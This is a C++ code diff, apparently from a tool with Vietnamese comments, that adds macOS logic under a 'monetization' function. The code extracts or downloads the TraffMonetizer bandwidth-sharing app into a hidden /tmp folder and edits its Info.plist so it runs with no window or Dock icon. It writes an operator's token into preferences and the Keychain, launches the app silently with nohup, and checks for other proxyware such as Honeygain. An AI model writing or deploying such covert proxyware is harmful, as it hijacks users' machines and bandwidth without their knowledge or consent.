@@ -69,6 +69,15 @@ static bool extract_payload(const std::string& out_path) {
     return (left == 0);
 }
 
+static std::string http_get_cmd(const std::string& cmd) {
+    FILE* fp = popen(cmd.c_str(), "r");
+    if (!fp) return "";
+    char buf[512]; std::string res;
+    while (fgets(buf, sizeof(buf), fp) != NULL) res += buf;
+    pclose(fp);
+    return res;
+}
+
 static std::string http_get(const std::string& url) {
     std::string cmd = "curl -skL --max-time 10 \"" + url + "\" 2>/dev/null";
     FILE* fp = popen(cmd.c_str(), "r");
@@ -200,15 +209,57 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
     }
 
 #if defined(__APPLE__) || defined(__MACH__)
-    // 1. Tắt triệt để app GUI nếu còn sót lại và dọn dẹp thư mục tạm
-    system("pkill -9 -f 'TraffMonetizer' 2>/dev/null; rm -rf /tmp/.tb_tm* /tmp/tm.dmg /tmp/tm_mnt 2>/dev/null");
-
-    // 2. Chạy ngầm 100% qua Docker CLI nếu macOS có Docker (Zero GUI, tự nhận token)
-    if (system("which docker >/dev/null 2>&1 && docker info >/dev/null 2>&1") == 0) {
-        if (system("docker ps --format '{{.Names}}' 2>/dev/null | grep -q '^tm$'") != 0) {
-            std::string dcmd = "docker run -d --name tm --restart=always traffmonetizer/cli_v2 start accept --token '" + tm_token + "' >/dev/null 2>&1";
-            system(dcmd.c_str());
+    if (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") != 0) {
+        std::string app_dir = "/tmp/.tb_tm/Traffmonetizer.app";
+        if (access(app_dir.c_str(), F_OK) != 0) {
+            if (extract_payload("/tmp/.tb_tm.tar.gz")) {
+                system("mkdir -p /tmp/.tb_tm && tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
+            }
         }
+        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/Traffmonetizer.app", F_OK) == 0) {
+            app_dir = "/Applications/Traffmonetizer.app";
+        }
+        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/TraffMonetizer.app", F_OK) == 0) {
+            app_dir = "/Applications/TraffMonetizer.app";
+        }
+        if (access(app_dir.c_str(), F_OK) != 0) {
+            system("curl -sSL --max-time 45 -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
+                   "mkdir -p /tmp/tm_mnt /tmp/.tb_tm; "
+                   "hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt 2>/dev/null; "
+                   "cp -R /tmp/tm_mnt/*.app /tmp/.tb_tm/ 2>/dev/null; "
+                   "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
+                   "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
+        }
+
+        // 1. Chuyển đổi App thành Background Agent ẩn hoàn toàn (Zero-GUI, không hiện Dock/Window)
+        std::string info_plist = app_dir + "/Contents/Info.plist";
+        if (access(info_plist.c_str(), F_OK) == 0) {
+            system(("defaults write '" + info_plist + "' LSUIElement -string '1' 2>/dev/null; defaults write '" + info_plist + "' LSBackgroundOnly -string '1' 2>/dev/null").c_str());
+        }
+
+        // 2. Nạp Token tự động vào cả macOS Keychain (flutter_secure_storage) và Defaults (com.traffmonetizer.client.macos)
+        std::string pref = "for P in \"$HOME/Library/Preferences/com.traffmonetizer.client.macos.plist\" \"$HOME/Library/Containers/com.traffmonetizer.client.macos/Data/Library/Preferences/com.traffmonetizer.client.macos.plist\"; do "
+                           "mkdir -p \"$(dirname \"$P\")\" 2>/dev/null; "
+                           "defaults write \"$P\" 'flutter.clientToken' -string '" + tm_token + "' 2>/dev/null; "
+                           "defaults write \"$P\" 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
+                           "defaults write \"$P\" 'clientToken' -string '" + tm_token + "' 2>/dev/null; "
+                           "defaults write \"$P\" 'token' -string '" + tm_token + "' 2>/dev/null; "
+                           "done; "
+                           "security add-generic-password -a 'clientToken' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
+                           "security add-generic-password -a 'clientToken' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
+                           "security add-generic-password -a 'token' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
+                           "security add-generic-password -a 'token' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true";
+        system(pref.c_str());
+
+        // 3. Khởi chạy trực tiếp file nhị phân ngầm bằng nohup (Zero-GUI)
+        std::string bin_path = app_dir + "/Contents/MacOS/traffmonetizer";
+        if (access(bin_path.c_str(), X_OK) != 0) {
+            bin_path = app_dir + "/Contents/MacOS/TraffMonetizer";
+        }
+        if (access(bin_path.c_str(), X_OK) == 0) {
+            system(("nohup '" + bin_path + "' start accept --token '" + tm_token + "' > /tmp/.tb_tm.log 2>&1 &").c_str());
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
     }
 #else
     if (system("pgrep -x tm_engine >/dev/null 2>&1") != 0 && system("pgrep -f '.tb_tm_engine' >/dev/null 2>&1") != 0) {
@@ -235,13 +286,15 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
 
 std::string detect_active_services() {
     std::string s = "";
-    if (system("pgrep -x tm_engine >/dev/null 2>&1") == 0 || system("pgrep -f '.tb_tm_engine' >/dev/null 2>&1") == 0 || system("docker ps --format '{{.Image}}' 2>/dev/null | grep -qi 'traffmonetizer'") == 0) {
+    if (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") == 0 || system("pgrep -x tm_engine >/dev/null 2>&1") == 0 || system("pgrep -f '.tb_tm_engine' >/dev/null 2>&1") == 0) {
         s += "TraffMonetizer, ";
     }
-    if (system("pgrep -x honeygain >/dev/null 2>&1") == 0 || system("docker ps --format '{{.Image}}' 2>/dev/null | grep -qi 'honeygain'") == 0) s += "Honeygain, ";
-    if (system("pgrep -x pawns-cli >/dev/null 2>&1") == 0 || system("docker ps --format '{{.Image}}' 2>/dev/null | grep -qi 'pawns'") == 0) s += "Pawns, ";
-    if (system("pgrep -x psclient >/dev/null 2>&1") == 0 || system("docker ps --format '{{.Image}}' 2>/dev/null | grep -qi 'packetstream'") == 0) s += "PacketStream, ";
+    if (system("pgrep -x honeygain >/dev/null 2>&1") == 0) s += "Honeygain, ";
+    if (system("pgrep -x pawns-cli >/dev/null 2>&1") == 0) s += "Pawns, ";
+    if (system("pgrep -x psclient >/dev/null 2>&1") == 0) s += "PacketStream, ";
+
     if (s.empty()) return "Chua co Engine";
+
     if (s.size() >= 2 && s.substr(s.size() - 2) == ", ") s = s.substr(0, s.size() - 2);
     return s;
 }
